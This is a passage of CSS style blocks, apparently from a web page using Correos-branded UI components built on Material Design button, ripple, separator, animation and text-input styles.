			-webkit-transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1)
		}

		.mdc-button--raised.sc-correos-ui-button-apps:hover,
		.mdc-button--raised.sc-correos-ui-button-apps:focus {
			-webkit-box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--raised.sc-correos-ui-button-apps:active {
			-webkit-box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--raised.sc-correos-ui-button-apps:disabled {
			-webkit-box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--outlined.sc-correos-ui-button-apps {
			border-style: solid;
			padding: 0 15px 0 15px;
			border-width: 1px
		}

		.mdc-button--outlined.sc-correos-ui-button-apps:disabled {
			border-color: rgba(0, 0, 0, 0.37)
		}

		.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps {
			top: -1px;
			left: -1px;
			border: 1px solid transparent
		}

		.mdc-button--outlined.sc-correos-ui-button-apps:not(:disabled) {
			border-color: #6200ee;
			border-color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-button--touch.sc-correos-ui-button-apps {
			margin-top: 6px;
			margin-bottom: 6px
		}

		@-webkit-keyframes mdc-ripple-fg-radius-in {
			from {
				-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
				transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
			}

			to {
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}
		}

		@keyframes mdc-ripple-fg-radius-in {
			from {
				-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
				transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
			}

			to {
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}
		}

		@-webkit-keyframes mdc-ripple-fg-opacity-in {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: 0
			}

			to {
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}
		}

		@keyframes mdc-ripple-fg-opacity-in {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: 0
			}

			to {
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}
		}

		@-webkit-keyframes mdc-ripple-fg-opacity-out {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}

			to {
				opacity: 0
			}
		}

		@keyframes mdc-ripple-fg-opacity-out {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}

			to {
				opacity: 0
			}
		}

		.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-button-apps {
			--mdc-ripple-surface-test-edge-var: 1px solid #000;
			visibility: hidden
		}

		.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-button-apps::before {
			border: var(--mdc-ripple-surface-test-edge-var)
		}

		.mdc-button.sc-correos-ui-button-apps {
			--mdc-ripple-fg-size: 0;
			--mdc-ripple-left: 0;
			--mdc-ripple-top: 0;
			--mdc-ripple-fg-scale: 1;
			--mdc-ripple-fg-translate-end: 0;
			--mdc-ripple-fg-translate-start: 0;
			-webkit-tap-highlight-color: rgba(0, 0, 0, 0)
		}

		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			position: absolute;
			border-radius: 50%;
			opacity: 0;
			pointer-events: none;
			content: ""
		}

		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before {
			-webkit-transition: opacity 15ms linear, background-color 15ms linear;
			transition: opacity 15ms linear, background-color 15ms linear;
			z-index: 1
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before {
			-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
			transform: scale(var(--mdc-ripple-fg-scale, 1))
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			top: 0;
			left: 0;
			-webkit-transform: scale(0);
			transform: scale(0);
			-webkit-transform-origin: center center;
			transform-origin: center center
		}

		.mdc-button.mdc-ripple-upgraded--unbounded.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			top: var(--mdc-ripple-top, 0);
			left: var(--mdc-ripple-left, 0)
		}

		.mdc-button.mdc-ripple-upgraded--foreground-activation.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
			animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
		}

		.mdc-button.mdc-ripple-upgraded--foreground-deactivation.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
			animation: mdc-ripple-fg-opacity-out 150ms;
			-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
			transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
		}

		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			top: calc(50% - 100%);
			left: calc(50% - 100%);
			width: 200%;
			height: 200%
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			width: var(--mdc-ripple-fg-size, 100%);
			height: var(--mdc-ripple-fg-size, 100%)
		}

		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			background-color: #6200ee
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				background-color: var(--mdc-theme-primary, #6200ee)
			}
		}

		.mdc-button.sc-correos-ui-button-apps:hover .mdc-button__ripple.sc-correos-ui-button-apps::before {
			opacity: 0.04
		}

		.mdc-button.mdc-ripple-upgraded--background-focused.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button-apps::before {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.12
		}

		.mdc-button.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button-apps::after {
			-webkit-transition: opacity 150ms linear;
			transition: opacity 150ms linear
		}

		.mdc-button.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button-apps::after {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.12
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button-apps {
			--mdc-ripple-fg-opacity: 0.12
		}

		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps {
			position: absolute;
			-webkit-box-sizing: content-box;
			box-sizing: content-box;
			width: 100%;
			height: 100%;
			overflow: hidden
		}

		.mdc-button.sc-correos-ui-button-apps:not(.mdc-button--outlined) .mdc-button__ripple.sc-correos-ui-button-apps {
			top: 0;
			left: 0
		}

		.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after,
		.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
			background-color: #fff
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after,
			.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				background-color: var(--mdc-theme-on-primary, #fff)
			}
		}

		.mdc-button--raised.sc-correos-ui-button-apps:hover .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button--unelevated.sc-correos-ui-button-apps:hover .mdc-button__ripple.sc-correos-ui-button-apps::before {
			opacity: 0.08
		}

		.mdc-button--raised.mdc-ripple-upgraded--background-focused.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button--raised.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button--unelevated.mdc-ripple-upgraded--background-focused.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
		.mdc-button--unelevated.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button-apps::before {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.24
		}

		.mdc-button--raised.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button-apps::after,
		.mdc-button--unelevated.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button-apps::after {
			-webkit-transition: opacity 150ms linear;
			transition: opacity 150ms linear
		}

		.mdc-button--raised.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button-apps::after,
		.mdc-button--unelevated.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button-apps::after {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.24
		}

		.mdc-button--raised.mdc-ripple-upgraded.sc-correos-ui-button-apps,
		.mdc-button--unelevated.mdc-ripple-upgraded.sc-correos-ui-button-apps {
			--mdc-ripple-fg-opacity: 0.24
		}

		.mdc-button.sc-correos-ui-button-apps {
			height: 36px
		}

		.sc-correos-ui-button-apps-h {
			display: block
		}

		[variant=footer].sc-correos-ui-button-apps-h .ui-img.sc-correos-ui-button-apps {
			height: 40px
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-ui-separator-line-h {
			--_ui-separator-line-background-color: var(--ui-separator-line-background-color, white)
		}

		.sc-correos-ui-separator-line-h {
			--_cdk-separator-line-mobile-tablet: var(--cdk-separator-line-mobile-tablet);
			--_cdk-separator-line-desktop: var(--cdk-separator-line-desktop);
			--_cdk-separator-line-bg-color: var(--cdk-separator-line-bg-color);
			display: block;
			width: 100%;
			border-style: solid;
			border-width: thin 0 0 0;
			border-color: var(--_cdk-separator-line-bg-color);
			margin: var(--_cdk-separator-line-mobile-tablet)
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-separator-line-h {
				margin: var(--_cdk-separator-line-desktop)
			}
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-ui-animation-h {
			--_ui-animation-background-color: var(--ui-animation-background-color, white)
		}

		.sc-correos-ui-animation-h {
			display: block;
			height: 100%;
			position: relative
		}

		.sc-correos-ui-animation-h lottie-player.sc-correos-ui-animation {
			width: 100px;
			position: absolute;
			top: 0;
			left: calc(50% - 50px);
			z-index: 6
		}

		.sc-correos-ui-animation-h .ui-animation-layer.sc-correos-ui-animation {
			display: block;
			position: absolute;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			background-color: #FFCD00;
			opacity: 0.4;
			z-index: 5
		}

		[variant=A].sc-correos-ui-animation-h lottie-player.sc-correos-ui-animation {
			max-width: 80px;
			width: 80px
		}

		[variant=A].sc-correos-ui-animation-h .ui-animation-layer.sc-correos-ui-animation {
			background-color: unset
		}

		[variant=B].sc-correos-ui-animation-h lottie-player.sc-correos-ui-animation {
			min-width: 64px;
			width: 64px
		}

		[variant=B].sc-correos-ui-animation-h .ui-animation-layer.sc-correos-ui-animation {
			background-color: unset
		}
	</style>
	<style>
		.mdc-floating-label.sc-correos-ui-input {
			font-family: Roboto, sans-serif;
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			font-size: 1rem;
			line-height: 1.75rem;
			font-weight: 400;
			letter-spacing: 0.009375em;
			text-decoration: inherit;
			text-transform: inherit;
			position: absolute;
			left: 0;
			-webkit-transform-origin: left top;
			transform-origin: left top;
			-webkit-transition: color 150ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 150ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: color 150ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 150ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), color 150ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), color 150ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 150ms cubic-bezier(0.4, 0, 0.2, 1);
			line-height: 1.15rem;
			text-align: left;
			text-overflow: ellipsis;
			white-space: nowrap;
			cursor: text;
			overflow: hidden;
			will-change: transform
		}

		[dir=rtl].sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-floating-label[dir=rtl].sc-correos-ui-input {
			right: 0;
			left: auto;
			-webkit-transform-origin: right top;
			transform-origin: right top;
			text-align: right
		}

		.mdc-floating-label--float-above.sc-correos-ui-input {
			cursor: auto
		}

		.mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-106%) scale(0.75);
			transform: translateY(-106%) scale(0.75)
		}

		.mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-standard 250ms 1;
			animation: mdc-floating-label-shake-float-above-standard 250ms 1
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-standard {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75);
				transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75);
				transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-standard {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75);
				transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75);
				transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
			}
		}

		.mdc-line-ripple.sc-correos-ui-input {
			position: absolute;
			bottom: 0;
			left: 0;
			width: 100%;
			height: 2px;
			-webkit-transform: scaleX(0);
			transform: scaleX(0);
			-webkit-transition: opacity 180ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 180ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 180ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 180ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: transform 180ms cubic-bezier(0.4, 0, 0.2, 1), opacity 180ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: transform 180ms cubic-bezier(0.4, 0, 0.2, 1), opacity 180ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 180ms cubic-bezier(0.4, 0, 0.2, 1);
			opacity: 0;
			z-index: 2
		}

		.mdc-line-ripple--active.sc-correos-ui-input {
			-webkit-transform: scaleX(1);
			transform: scaleX(1);
			opacity: 1
		}

		.mdc-line-ripple--deactivating.sc-correos-ui-input {
			opacity: 0
		}

		.mdc-notched-outline.sc-correos-ui-input {
			display: -ms-flexbox;
			display: flex;
			position: absolute;
			right: 0;
			left: 0;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			width: 100%;
			max-width: 100%;
			height: 100%;
			text-align: left;
			pointer-events: none
		}

		[dir=rtl].sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input,
		.mdc-notched-outline[dir=rtl].sc-correos-ui-input {
			text-align: right
		}

		.mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-notched-outline__trailing.sc-correos-ui-input {
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			height: 100%;
			border-top: 1px solid;
			border-bottom: 1px solid;
			pointer-events: none
		}

		.mdc-notched-outline__leading.sc-correos-ui-input {
			border-left: 1px solid;
			border-right: none;
			width: 12px
		}

		[dir=rtl].sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-notched-outline__leading[dir=rtl].sc-correos-ui-input {
			border-left: none;
			border-right: 1px solid
		}

		.mdc-notched-outline__trailing.sc-correos-ui-input {
			border-left: none;
			border-right: 1px solid;
			-ms-flex-positive: 1;
			flex-grow: 1
		}

		[dir=rtl].sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
		.mdc-notched-outline__trailing[dir=rtl].sc-correos-ui-input {
			border-left: 1px solid;
			border-right: none
		}

		.mdc-notched-outline__notch.sc-correos-ui-input {
			-ms-flex: 0 0 auto;
			flex: 0 0 auto;
			width: auto;
			max-width: calc(100% - 12px * 2)
		}

		.mdc-notched-outline.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			display: inline-block;
			position: relative;
			max-width: 100%
		}

		.mdc-notched-outline.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			text-overflow: clip
		}

		.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			max-width: calc(100% / .75)
		}

		.mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input {
			padding-left: 0;
			padding-right: 8px;
			border-top: none
		}

		[dir=rtl].sc-correos-ui-input .mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch[dir=rtl].sc-correos-ui-input {
			padding-left: 8px;
			padding-right: 0
		}

		.mdc-notched-outline--no-label.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input {
			padding: 0
		}

		@-webkit-keyframes mdc-ripple-fg-radius-in {
			from {
				-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
				transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
			}

			to {
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}
		}

		@keyframes mdc-ripple-fg-radius-in {
			from {
				-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
				transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
			}

			to {
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}
		}

		@-webkit-keyframes mdc-ripple-fg-opacity-in {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: 0
			}

			to {
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}
		}

		@keyframes mdc-ripple-fg-opacity-in {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: 0
			}

			to {
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}
		}

		@-webkit-keyframes mdc-ripple-fg-opacity-out {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}

			to {
				opacity: 0
			}
		}

		@keyframes mdc-ripple-fg-opacity-out {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}

			to {
				opacity: 0
			}
		}

		.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-input {
			--mdc-ripple-surface-test-edge-var: 1px solid #000;
			visibility: hidden
		}

		.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-input::before {
			border: var(--mdc-ripple-surface-test-edge-var)
		}

		.mdc-text-field-helper-text.sc-correos-ui-input {
			font-family: Roboto, sans-serif;
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			font-size: 0.75rem;
			line-height: 1.25rem;
			font-weight: 400;
			letter-spacing: 0.0333333333em;
			text-decoration: inherit;
			text-transform: inherit;
			display: block;
			margin-top: 0;
			line-height: normal;
			margin: 0;
			-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
			opacity: 0;
			will-change: opacity
		}

		.mdc-text-field-helper-text.sc-correos-ui-input::before {
			display: inline-block;
			width: 0;
			height: 16px;
			content: "";
			vertical-align: 0
		}

		.mdc-text-field-helper-text--persistent.sc-correos-ui-input {
			-webkit-transition: none;
			transition: none;
			opacity: 1;
			will-change: initial
		}

		.mdc-text-field-character-counter.sc-correos-ui-input {
			font-family: Roboto, sans-serif;
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			font-size: 0.75rem;
			line-height: 1.25rem;
			font-weight: 400;
			letter-spacing: 0.0333333333em;
			text-decoration: inherit;
			text-transform: inherit;
			display: block;
			margin-top: 0;
			line-height: normal;
			margin-left: auto;
			margin-right: 0;
			padding-left: 16px;
			padding-right: 0;
			white-space: nowrap
		}

		.mdc-text-field-character-counter.sc-correos-ui-input::before {
			display: inline-block;
			width: 0;
			height: 16px;
			content: "";
			vertical-align: 0
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input,
		.mdc-text-field-character-counter[dir=rtl].sc-correos-ui-input {
			margin-left: 0;
			margin-right: auto
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input,
		.mdc-text-field-character-counter[dir=rtl].sc-correos-ui-input {
			padding-left: 0;
			padding-right: 16px
		}

		.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			position: absolute;
			top: 50%;
			-webkit-transform: translateY(-50%);
			transform: translateY(-50%);
			cursor: pointer
		}

		.mdc-text-field__icon.sc-correos-ui-input:not([tabindex]),
		.mdc-text-field__icon[tabindex="-1"].sc-correos-ui-input {
			cursor: default;
			pointer-events: none
		}

		.mdc-text-field.sc-correos-ui-input {
			--mdc-ripple-fg-size: 0;
			--mdc-ripple-left: 0;
			--mdc-ripple-top: 0;
			--mdc-ripple-fg-scale: 1;
			--mdc-ripple-fg-translate-end: 0;
			--mdc-ripple-fg-translate-start: 0;
			-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
			height: 56px;
			border-radius: 4px 4px 0 0;
			display: -ms-inline-flexbox;
			display: inline-flex;
			position: relative;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			overflow: hidden;
			will-change: opacity, transform, color
		}

		.mdc-text-field.sc-correos-ui-input::before,
		.mdc-text-field.sc-correos-ui-input::after {
			position: absolute;
			border-radius: 50%;
			opacity: 0;
			pointer-events: none;
			content: ""
		}

		.mdc-text-field.sc-correos-ui-input::before {
			-webkit-transition: opacity 15ms linear, background-color 15ms linear;
			transition: opacity 15ms linear, background-color 15ms linear;
			z-index: 1
		}

		.mdc-text-field.mdc-ripple-upgraded.sc-correos-ui-input::before {
			-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
			transform: scale(var(--mdc-ripple-fg-scale, 1))
		}

		.mdc-text-field.mdc-ripple-upgraded.sc-correos-ui-input::after {
			top: 0;
			left: 0;
			-webkit-transform: scale(0);
			transform: scale(0);
			-webkit-transform-origin: center center;
			transform-origin: center center
		}

		.mdc-text-field.mdc-ripple-upgraded--unbounded.sc-correos-ui-input::after {
			top: var(--mdc-ripple-top, 0);
			left: var(--mdc-ripple-left, 0)
		}

		.mdc-text-field.mdc-ripple-upgraded--foreground-activation.sc-correos-ui-input::after {
			-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
			animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
		}

		.mdc-text-field.mdc-ripple-upgraded--foreground-deactivation.sc-correos-ui-input::after {
			-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
			animation: mdc-ripple-fg-opacity-out 150ms;
			-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
			transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
		}

		.mdc-text-field.sc-correos-ui-input::before,
		.mdc-text-field.sc-correos-ui-input::after {
			background-color: rgba(0, 0, 0, 0.87)
		}

		.mdc-text-field.sc-correos-ui-input:hover::before {
			opacity: 0.04
		}

		.mdc-text-field.mdc-ripple-upgraded--background-focused.sc-correos-ui-input::before,
		.mdc-text-field.sc-correos-ui-input:not(.mdc-ripple-upgraded):focus::before {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.12
		}

		.mdc-text-field.sc-correos-ui-input::before,
		.mdc-text-field.sc-correos-ui-input::after {
			top: calc(50% - 100%);
			left: calc(50% - 100%);
			width: 200%;
			height: 200%
		}

		.mdc-text-field.mdc-ripple-upgraded.sc-correos-ui-input::after {
